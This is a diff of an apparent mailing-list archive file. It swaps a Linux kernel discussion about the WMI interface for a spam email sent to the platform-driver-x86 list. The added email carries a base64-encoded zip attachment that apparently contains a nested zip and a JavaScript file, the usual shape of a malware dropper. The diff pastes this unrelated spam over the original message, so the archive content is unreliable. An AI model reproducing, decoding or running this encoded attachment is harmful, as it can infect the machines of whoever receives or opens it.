@@ -1,65 +1,81 @@
-From: Christoph Hellwig <hch@infradead.org>
-Subject: Re: WMI and Kernel:User interface
-Date: Tue, 13 Jun 2017 00:05:35 -0700
-Message-ID: <20170613070535.GA13252@infradead.org>
-References: <20170509231639.GB11404@fury>
- <201706101236.40663@pali>
- <20170612170249.GA27850@fury>
- <201706130017.29023@pali>
- <20170613012435.GB27850@fury>
+From: <horizon@qubeglobal.com>
+Subject: (unknown)
+Date: Tue, 13 Jun 2017 08:14:28 -0000
+Message-ID: <149734166805.29697.5185819543634509742@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170613012435.GB27850@fury>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Darren Hart <dvhart@infradead.org>
-Cc: Pali =?iso-8859-1?Q?Roh=E1r?= <pali.rohar@gmail.com>, Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Linus Torvalds <torvalds@linux-foundation.org>, Mario Limonciello <mario_limonciello@dell.com>, Andy Shevchenko <andriy.shevchenko@linux.intel.com>, Rafael Wysocki <rjw@rjwysocki.net>, Andy Lutomirski <luto@amacapital.net>, LKML <linux-kernel@vger.kernel.org>, platform-driver-x86@vger.kernel.org
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="480167506794.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from ws9.zone31-163-168.zaural.ru ([31.163.168.9]:48965 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751753AbdFMIOd (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Tue, 13 Jun 2017 04:14:33 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-Hi Darren,
-
-first - can you please properly trim your replies and don't write
-more than 7 characters per line?
-
-On Mon, Jun 12, 2017 at 06:24:35PM -0700, Darren Hart wrote:
-> This is a big topic for sure. Speed and scale of platform enabling is something
-> I would like to see us support better. The barrier to entry to kernel
-> changes is high, especially for trivial things, like adding IDs, GUIDs, etc.
-> which would ideally, IMHO, be in the hands of the OEMs.
-
-It's not.  It's a trivial patch, and you cover all Linux users.  Very
-much unlike say the windows world where you are stuck with installing
-a vendor specific set of drivers forever.
-
-> Ideally, we would provide a generic way for users/OEMs/vendors to successfully
-> support and maintain their own platforms, ideally with as little kernel changes
-> as possible. If we can get closer to that than we are today with this WMI work,
-> I think that is worth the effort.
-
-Hell no!  The last thing we need on Linux is systems that once support
-us added don't just work out of the box because you're missing your
-vendor blob.
-
-> > And filter layer which will accept only WMI calls which are safe for 
-> > currently loaded/used kernel modules seems like a sane idea to ensure 
-> > functionality of kernel plus allow userspace to do other things.
-> 
-> My biggest concern with this approach is maintenance. Because we would be doing
-> something unforeseen by the specification, the various vendor implemented WMI
-> APIs are not likely to be amenable to filtering. I can see these filters
-> getting extremely complicated. They are "high touch", by which I mean each
-> generation of platform may require subtle tweaks, which will be difficult to
-> verify they don't break past generations.
-
-Agreed.  As mentioned before I think the only sensible approach is
-white listing GUIDs that have a valid userspace use case.  And use
-the dynamic IDs approach to add them for debugging and reverse
-engineering.
-
-> There are certainly pros and cons. While this approach results in duplication of
-> effort, it also allows vendors to "own their own destiny" and innovate and
-> support their platforms independently. It also minimizes the amount of dead code
-> accumulating for platforms that just don't exist for very long.
-
-Bullshit alert..
+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
+AABQSwUGAAAAAAEAAQBPAAAASA0AAAAA
